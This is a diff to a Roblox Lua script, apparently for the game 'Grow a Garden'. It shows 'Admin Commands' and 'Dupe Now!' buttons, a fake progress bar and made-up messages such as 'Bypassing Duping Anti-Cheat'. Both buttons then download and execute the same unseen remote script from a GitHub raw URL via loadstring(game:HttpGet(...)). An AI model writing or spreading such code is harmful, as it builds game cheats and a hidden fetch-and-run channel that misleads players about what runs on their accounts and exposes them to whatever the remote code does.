@@ -24,7 +24,7 @@ layout.FillDirection = Enum.FillDirection.Vertical
 layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 layout.VerticalAlignment = Enum.VerticalAlignment.Center
 
--- Loading Screen with percent and progress bar
+-- Loading Screen
 local function createFullscreenLoading(message)
 	local screen = Instance.new("ScreenGui", playerGui)
 	screen.Name = "FullLoadingScreen"
@@ -74,14 +74,20 @@ local function createFullscreenLoading(message)
 	Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 5)
 
 	task.spawn(function()
-		for i = 0, 100 do
-			local tween = TweenService:Create(progressBar, TweenInfo.new(0.025, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-				Size = UDim2.new(i / 100, 0, 1, 0)
-			})
-			tween:Play()
-			percent.Text = i .. "%"
-			wait(0.025)
+		local maxTime = 2.5
+		local steps = 50
+		for i = 1, steps do
+			local percentValue = math.floor(i / steps * 100)
+			percent.Text = percentValue .. "%"
+			TweenService:Create(progressBar, TweenInfo.new(0.03), {
+				Size = UDim2.new(i / steps, 0, 1, 0)
+			}):Play()
+			wait(maxTime / steps)
 		end
+
+		-- Force to 100% if not yet
+		percent.Text = "100%"
+		progressBar.Size = UDim2.new(1, 0, 1, 0)
 
 		-- Fade out
 		local fadeOutInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
@@ -90,7 +96,7 @@ local function createFullscreenLoading(message)
 		TweenService:Create(percent, fadeOutInfo, {TextTransparency = 1}):Play()
 		TweenService:Create(progressBar, fadeOutInfo, {BackgroundTransparency = 1}):Play()
 		TweenService:Create(progressBarBg, fadeOutInfo, {BackgroundTransparency = 1}):Play()
-		task.wait(1.1)
+		wait(1.1)
 		screen:Destroy()
 	end)
 
@@ -112,7 +118,7 @@ local function createButton(name)
 end
 
 -- Click logic
-local function onButtonClick(clickedButton, loadingMessage)
+local function onButtonClick(clickedButton, loadingMessage, scriptURL)
 	local originalText = clickedButton.Text
 	clickedButton.Text = ""
 
@@ -135,7 +141,7 @@ local function onButtonClick(clickedButton, loadingMessage)
 		end
 	end
 
-	-- Shrink frame
+	-- Shrink main frame
 	local shrinkTween = TweenService:Create(mainFrame, TweenInfo.new(0.4), {
 		Size = UDim2.new(0, 0, 0, 0),
 		Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -148,20 +154,21 @@ local function onButtonClick(clickedButton, loadingMessage)
 	local screen = createFullscreenLoading(loadingMessage)
 
 	task.delay(2.6, function()
-		-- Execute external script AFTER loading screen
 		pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
+			loadstring(game:HttpGet(scriptURL))()
 		end)
 	end)
 end
 
 -- Buttons
-local adminButton = createButton("Admin Abuse")
+local adminButton = createButton("Admin Commands")
 adminButton.MouseButton1Click:Connect(function()
-	onButtonClick(adminButton, "Bypassing Command Panel, Please Wait.")
+	onButtonClick(adminButton, "Finding a Low Server In order Admin Commands Work.",
+		"https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua")
 end)
 
 local dupeButton = createButton("Dupe Now!")
 dupeButton.MouseButton1Click:Connect(function()
-	onButtonClick(dupeButton, "Bypassing Duping Anti-Cheat, Please Wait.")
+	onButtonClick(dupeButton, "Finding a Low Server In order Dupe to Work.",
+		"https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua")
 end)
